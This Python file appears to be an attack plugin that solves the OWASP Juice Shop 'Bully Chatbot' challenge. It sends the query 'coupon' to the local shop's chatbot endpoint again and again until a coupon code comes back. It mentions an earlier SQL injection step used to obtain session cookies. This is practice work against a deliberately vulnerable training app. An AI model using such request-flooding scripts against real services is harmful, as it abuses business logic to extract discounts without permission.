"""
This file is used to solve the OWASP Juice-shop Task BULLY CHATBOT
Methodology: We can send the COUPON message to the supporter machine several times, until it gives us COUPON
"""
import requests

from plugins import attack as a
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class test_get_coupon_class(a.attack_inter):
    def __init__(self):
        # First trying to load cookies from local cookie file
        self.juice_session = a.requests.session()

    def generator(self):
        cookie = a.load_cookie()
        json_data = {
            'action': 'query',
            'query': 'coupon',
        }

        return json_data, cookie

    def run(self):

        json_data, cookie = self.generator()
        if cookie:
            response = self.juice_session.post('http://localhost:3000/rest/chatbot/respond', json=json_data, cookies=cookie)
            while (response.text.find("pes[Cga+jm") == -1 ):
                # cookies, headers, json_data = self.generator(json_data, new_cookie)
                response = self.juice_session.post('http://localhost:3000/rest/chatbot/respond', json=json_data, cookies=cookie)
                print(response.text)

            print("we found coupon:")
            print(response.text)
        else:
            print("Not have authentification yet, please try SQL injection first")